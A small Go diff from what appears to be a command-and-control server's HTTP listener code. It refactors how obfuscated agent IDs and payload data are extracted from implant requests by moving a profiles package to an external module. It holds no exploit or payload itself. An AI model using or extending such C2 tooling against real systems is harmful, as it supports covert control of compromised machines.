@@ -3,12 +3,12 @@ package listeners
 import (
 	"c2/models"
 	"c2/repos"
-	"common/profiles"
 	"errors"
 	"log"
 	"net/http"
 	"strings"
 
+	profiles "github.com/zarkones/ControlPROFILE"
 	"gorm.io/gorm"
 )
 
@@ -26,7 +26,7 @@ func maybeAbort(err error, r *http.Request) (abort bool) {
 }
 
 func getID(req *profiles.ProfileRequest, r *http.Request) (agentID string, err error) {
-	obfuscatedAgentID, err := extractPlacement(&req.ID.Placement, r)
+	obfuscatedAgentID, err := req.ID.Placement.Extract(r)
 	if err != nil {
 		return "", err
 	}
@@ -34,7 +34,7 @@ func getID(req *profiles.ProfileRequest, r *http.Request) (agentID string, err e
 }
 
 func getBody(req *profiles.ProfileRequest, r *http.Request) (agentID string, err error) {
-	obfuscatedData, err := extractPlacement(&req.Payload.Request.Placement, r)
+	obfuscatedData, err := req.Payload.Request.Placement.Extract(r)
 	if err != nil {
 		return "", err
 	}
